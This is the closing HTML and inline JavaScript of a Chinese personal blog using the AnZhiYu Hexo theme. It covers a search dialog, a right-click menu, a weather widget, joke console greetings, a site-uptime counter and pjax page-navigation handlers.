theme="var(--anzhiyu-main)" data-lrctype="0" order="random"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div id="he-plugin-simple"></div><script>var WIDGET = {
+  "CONFIG": {
+    "modules": "0124",
+    "background": "2",
+    "tmpColor": "FFFFFF",
+    "tmpSize": "16",
+    "cityColor": "FFFFFF",
+    "citySize": "16",
+    "aqiColor": "E8D87B",
+    "aqiSize": "16",
+    "weatherIconSize": "24",
+    "alertIconSize": "18",
+    "padding": "10px 10px 10px 10px",
+    "shadow": "0",
+    "language": "auto",
+    "borderRadius": "20",
+    "fixed": "true",
+    "vertical": "top",
+    "horizontal": "left",
+    "left": "20",
+    "top": "7.1",
+    "key": "df245676fb434a0691ead1c63341cd94"
+  }
+}
+</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("10/04/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2023 By 安知鱼 V1.6.8",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Sherlock 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
+  var grt = new Date("10/04/2023 00:00:00"); //设置网站上线时间
+  var now = new Date();
+  var dnum;
+  var hnum;
+  var mnum;
+  var snum;
+  var nowHour;
+
+  // 计算并更新天数、小时数、分钟数和秒数
+  function updateTime() {
+    now = new Date(); // 更新 now 的值
+    nowHour = now.getHours(); // 更新 nowHour 的值
+    var days = (now - grt) / 1000 / 60 / 60 / 24;
+    dnum = Math.floor(days);
+    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
+    hnum = Math.floor(hours);
+    if (String(hnum).length == 1) {
+      hnum = "0" + hnum;
+    }
+    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
+    mnum = Math.floor(minutes);
+    if (String(mnum).length == 1) {
+      mnum = "0" + mnum;
+    }
+    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
+    snum = Math.round(seconds);
+    if (String(snum).length == 1) {
+      snum = "0" + snum;
+    }
+  }
+
+  // 更新网页中显示的网站运行时间
+  function updateHtml() {
+    const footer = document.getElementById("footer");
+    if (!footer) return
+    let currentTimeHtml = "";
+    if (nowHour < 18 && nowHour >= 9) {
+      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
+      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
+    } else {
+      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
+      let img = document.querySelector("#workboard .workSituationImg");
+      img.src = "https://npm.elemecdn.com/anzhiyu-blog@2.0.4/img/badge/安知鱼-下班啦.svg";
+      img.title = "下班了就该开开心心的玩耍，嘿嘿~";
+      img.alt = "下班了就该开开心心的玩耍，嘿嘿~";
+
+      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
+    }
+
+    if (document.getElementById("runtimeTextTip")) {
+      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
+    }
+  }
+
+  setInterval(() => {
+    updateTime();
+    updateHtml();
+  }, 1000);
+})();</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "visitor@anheyu.com";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
